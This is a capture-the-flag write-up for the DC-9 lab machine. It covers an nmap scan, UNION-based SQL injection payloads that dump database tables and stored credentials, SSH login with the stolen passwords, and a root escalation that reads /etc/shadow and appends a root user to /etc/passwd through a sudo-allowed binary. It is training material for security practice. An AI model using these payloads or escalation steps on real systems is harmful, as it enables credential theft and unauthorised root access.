# DC-9

## Enumeration&#x20;

### Nmap scan&#x20;

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:57:f3:c6:9a:c4:d7:0c:9c:c5:d0:70:5d:6a:2d:82 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmfZpXrnO5i6dlZ6qvr7YtFHdo/Qq2d1FsuJQsrzlOFnT0SlT3cxnosPghy21W1kHJ/6Lf70LWOEIFk3c0xcO4YkTcb3ctiY7Qi0y2bVuEIgZyrM+UFPdb1FsaBt9//K/Ov9Tow0hpqPQLc97WRD9TLa75j+rTs/S22gkmjjJgQHW7k7P0hPPLCfTlOjsw8tx6Y9A2p5GhtPBjzLxL8LZ6R3H2WKK+4pqqKXMaM3KeMfqGXzI11SJLdY62RbWyPVc0UhWHoGRjCMt00d1p/4mPIRG7T2v80PbH/FuITsSO/73eWlfe3JX95shpSk/ftODVsZIYkIBOm5+POi7yFUnZ
|   256 9c:dc:79:ef:3d:15:6e:e4:29:5c:a4:b1:e2:08:46:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDstaGzVLn4h7dPEmJe4TlcC62jZA+6KG8KKj5/w8pqCkL5fc4wzjSZlA2/0mTOLJUXJE/MyvSnoZqFpZm6ycDo=
|   256 32:f1:8a:2d:f6:8c:0a:98:56:33:48:c7:0d:32:e6:d2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILN+0oQ02qpCBEYwuSM5Meot0421npLXNqjN+NLK1q6n
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
```

### Port 80 - HTTP&#x20;

After browsing through the web application, I came across a display.php page that exposed a list of usernames under the display all records.

<figure><img src="../.gitbook/assets/image (635).png" alt=""><figcaption></figcaption></figure>

While exploring the Search functionality, I noticed that the application accepts user input to search by first or last name. I tested it by injecting a simple SQL payload (`marym ' OR '1'='1`) to check for potential SQL injection vulnerabilities.

<figure><img src="../.gitbook/assets/image (636).png" alt=""><figcaption></figcaption></figure>

```
Command:- marym' UNION SELECT 1,2,3,4,5,6-- -
```

The payload was successful, and the application returned multiple records. From the output, I identified that the table contains 6 columns and noticed some interesting table names, including `StaffDetails`, `Users`, and `UserDetails`.

```
Command:-  marym' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables-- -
```

<figure><img src="../.gitbook/assets/image (637).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (638).png" alt=""><figcaption></figcaption></figure>



I found a `Users` table containing admin credentials, but the retrieved credentials were not valid. I then moved on to the `UserDetails` table and, after checking the available schemas, noticed a separate database named `users`, which I used to retrieve the relevant data.

```
Command:- marym' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name='Users'-- -
```

<figure><img src="../.gitbook/assets/image (639).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

Able to crack the hash but it seems like a rabbit hole, and moved to another table called userdetails&#x20;

<figure><img src="../.gitbook/assets/image (641).png" alt=""><figcaption></figcaption></figure>

```
Command:- marym' UNION SELECT 1,schema_name,3,4,5,6 from inforamtion_schema.schemata-- -
```

<figure><img src="../.gitbook/assets/image (642).png" alt=""><figcaption></figcaption></figure>

After identifying the `users` database, I accessed its `UserDetails` table and used a UNION-based SQL injection to retrieve the `username` and `password` columns. This allowed me to extract the credentials stored in the table

```
Command:- marym' UNION SELECT 1,username,password,4,5,6 FROM users.UserDetails-- -
```

<figure><img src="../.gitbook/assets/image (643).png" alt=""><figcaption></figcaption></figure>

After reviewing the extracted credentials, I identified three users who appeared to have SSH access to the target machine on port 22

<figure><img src="../.gitbook/assets/image (644).png" alt=""><figcaption></figcaption></figure>

### Port 22 - SSH&#x20;

After gaining access as `janitor`, I explored the user's home directory and came across a hidden directory named `.secrets-for-putin`. Inside it, I found a file named `passwords-found-on-post-it-notes.txt`, which appeared to contain additional credentials.

<figure><img src="../.gitbook/assets/image (645).png" alt=""><figcaption></figcaption></figure>

While reviewing the `passwords-found-on-post-it-notes.txt` file in Janitor's home directory, I found a password belonging to another user, `fredf`.

<figure><img src="../.gitbook/assets/image (646).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation&#x20;

Running `sudo -l` showed `fredf` could run `/opt/devstuff/dist/test/test` as root with no password. I saw it takes one file and appends it to another, so I tested reading `/etc/shadow` first just to make sure it worked. Once I confirmed it, I just appended a new root user straight into `/etc/passwd` and switched over to get root.

<figure><img src="../.gitbook/assets/image (647).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (648).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>



